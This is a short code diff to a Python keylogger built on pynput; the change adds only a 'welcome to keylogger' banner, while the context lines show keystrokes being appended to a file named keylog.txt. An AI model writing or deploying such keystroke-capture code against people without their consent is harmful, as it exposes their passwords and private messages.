@@ -2,6 +2,14 @@ from pynput import keyboard
 
 log_file = "keylog.txt"
 
+banner = """
+===========================================
+  W E L C O M E   T O   K E Y L O G G E R
+===========================================
+
+"""
+print(banner)
+
 def on_press(key):
     try:
         with open(log_file, "a") as f:
